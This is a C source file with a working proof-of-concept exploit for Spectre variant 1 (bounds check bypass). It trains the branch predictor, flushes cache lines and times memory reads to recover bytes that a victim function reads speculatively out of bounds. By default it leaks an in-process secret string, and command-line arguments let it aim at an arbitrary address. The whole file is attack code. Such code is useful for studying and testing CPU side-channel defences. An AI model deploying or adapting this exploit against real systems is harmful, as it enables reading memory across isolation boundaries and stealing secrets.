#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#ifdef _MSC_VER
#include <intrin.h> /* for rdtscp and clflush */
#pragma optimize("gt", on)
#else
#include <x86intrin.h> /* for rdtscp and clflush */
#endif

 /********************************************************************
 Victim code.
 ********************************************************************/
 unsigned int array1_size = 16;
 uint8_t unused1[64];
 uint8_t array1[160] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16};
 uint8_t unused2[64];
 uint8_t array2[256 * 512];

 char *secret = "The Magic Words are Classical Ostarich.";

 uint8_t temp = 0; /* To not optimize out victim_function() */

 void victim_function(size_t x) {
	 if (x < array1_size) {
	 	temp &= array2[array1[x] * 512];
	 }
 }

 /********************************************************************
 Analysis code
 ********************************************************************/
 #define CACHE_HIT_THRESHOLD (80) /* cache hit if time <= threshold */

 /* Report best guess in value[0] and runner-up in value[1] */
 void readMemoryByte(size_t malicious_x, uint8_t value[2],
 int score[2]) {
	 static int results[256];
	 int tries, i, j, k, mix_i, junk = 0;
	 size_t training_x, x;
	 register uint64_t time1, time2;
	 volatile uint8_t *addr;

	 for (i = 0; i < 256; i++)
	 	    results[i] = 0;
	 for (tries = 10; tries > 0; tries--) {
		 /* 5 trainings (x=training_x) per attack run (x=malicious_x) */
		 training_x = tries % array1_size;
		 for (j = 29; j >= 0; j--) {
		 	_mm_clflush(&array1_size);
		 for (volatile int z = 0; z < 100; z++) {
		 } /* Delay (can also mfence) */

		 /* Bit twiddling to set x=training_x if j % 6 != 0
		 * or malicious_x if j % 6 == 0 */
		 /* Avoid jumps in case those tip off the branch predictor */
		 /* Set x=FFF.FF0000 if j%6==0, else x=0 */
		 x = ((j % 6) - 1) & ~0xFFFF;
		 /* Set x=-1 if j&6=0, else x=0 */
		 x = (x | (x >> 16));
		 x = training_x ^ (x & (malicious_x ^ training_x));
		 /* Flush array2[256*(0..255)] from cache */
		 for (i = 0; i < 256; i++)
		 	_mm_clflush(&array2[i * 512]); /* clflush */
		 /* Call the victim! */
		 victim_function(x);
		 }

		 /* Time reads. Mixed-up order to prevent stride prediction */
		 for (i = 0; i < 256; i++) {
			 mix_i = ((i * 167) + 13) & 255;
			 addr = &array2[mix_i * 512];
			 time1 = __rdtscp(&junk);
			 junk = *addr; /* Time memory acrcess */
			 time2 = __rdtscp(&junk) - time1; /* Compute elapsed time */
			 
			 if (time2 <= CACHE_HIT_THRESHOLD)
			 	results[mix_i]++; /* cache hit -> score +1 for this value */
		 }
	 }
	 /* Locate highest & second-highest results */
	 j = k = -1;
	 for (i = 0; i < 256; i++) {
		 if (j < 0 || results[i] >= results[j]) {
			 k = j;
			 j = i;
		 } else if (k < 0 || results[i] >= results[k]) {
		 	k = i;
		 }
	 }
	 
	 /* use junk to prevent code from being optimized out */
	 results[0] ^= junk;
	 value[0] = (uint8_t)j;
	 score[0] = results[j];
	 value[1] = (uint8_t)k;
	 score[1] = results[k];
 }

 int main(int argc, const char **argv) {
	 size_t malicious_x =
	 (size_t)(secret - (char *)array1); /* default for malicious_x */
	 int i, score[2], len = 100;
	 uint8_t value[2];

	 for (i = 0; i < sizeof(array2); i++)
	 	array2[i] = 1; /* write to array2 to ensure it is memory backed */
	 if (argc == 3) {
		 malicious_x = strtoull(argv[1], NULL, 16);
		 sscanf(argv[2], "%d", &len);
 	 }
 	 //printf("%p",(void *)malicious_x);

	 //printf("Reading %d bytes:\n", len);
	 while (--len >= 0) {
		readMemoryByte(malicious_x++, value, score);
		if (2*score[0] > score[1])
			printf("%c", value[0]);
		//else
			//printf("%c",0);
	 }

	 return (0);
 }

